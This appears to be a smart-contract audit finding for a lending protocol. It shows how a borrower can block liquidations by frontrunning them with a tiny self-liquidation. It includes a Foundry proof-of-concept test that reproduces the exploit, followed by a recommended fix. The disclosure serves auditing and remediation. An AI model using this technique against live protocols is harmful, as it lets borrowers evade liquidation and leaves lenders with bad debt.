---
id: 25258
severity: "Crit/High"
---

# Liquidations can be prevented by frontrunning and liquidating 1 debt (or more) due to wrong assumption in POS_MANAGER

## Description



## Proof of Concept

The `POS_MANAGER` stores the total interest in `__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest`. Function `updatePosDebtShares()` [assumes](<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/PosManager.sol#L175>) that `ILendingPool(_pool).debtShareToAmtCurrent(currDebtShares)` is always increasing, but this is not the case, as a liquidation may happen that reduces the current debt amount. This leads to calls to `updatePosDebtShares()` reverting.

The most relevant is when liquidating, such that users could liquidate themselves for small amounts (1) and prevent liqudiations in the same block. This is because the debt accrual happens over time, so if the block.timestamp is the same, no debt accrual will happen. Thus, if a liquidate call with 1 amount frontruns a liquidate call with any amount, the second call will revert.

A user could still stop liquidations for as long as the accrued interest doesn't reach the last debt value before liquidation, if the user liquidated a bigger part of the debt.

Add the following test to `TestInitCore.sol`:

```
function test_POC_Liquidate_reverts_frontrunning_PosManager_WrongAssumption() public {
    address poolUSDT = address(lendingPools[USDT]);
    address poolWBTC = address(lendingPools[WBTC]);
    _setTargetHealthAfterLiquidation_e18(1, type(uint64).max); // by pass max health after liquidate capped
    _setFixedRateIRM(poolWBTC, 0.1e18); // 10% per sec

    uint collAmt;
    uint borrAmt;

    {
        uint collUSD = 100_000;
        uint borrUSDMax = 80_000;
        collAmt = _priceToTokenAmt(USDT, collUSD);
        borrAmt = _priceToTokenAmt(WBTC, borrUSDMax);
    }

    address liquidator = BOB;
    deal(USDT, ALICE, collAmt);
    deal(WBTC, liquidator, borrAmt * 2);

    // provides liquidity for borrow
    _fundPool(poolWBTC, borrAmt);

    // create position and collateralize
    uint posId = _createPos(ALICE, ALICE, 1);
    _collateralizePosition(ALICE, posId, poolUSDT, collAmt, bytes(''));

    // borrow
    _borrow(ALICE, posId, poolWBTC, borrAmt, bytes(''));

    // fast forward time and accrue interest
    vm.warp(block.timestamp + 1 seconds);
    ILendingPool(poolWBTC).accrueInterest();

    uint debtShares = positionManager.getPosDebtShares(posId, poolWBTC);

    _liquidate(liquidator, posId, 1, poolWBTC, poolUSDT, false, bytes(''));

    // liquidate all debtShares
    _liquidate(liquidator, posId, 1000, poolWBTC, poolUSDT, false, bytes('panic'));
}
```

## Recommendation

Update the user's last debt position `__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest` on `_repay()`.
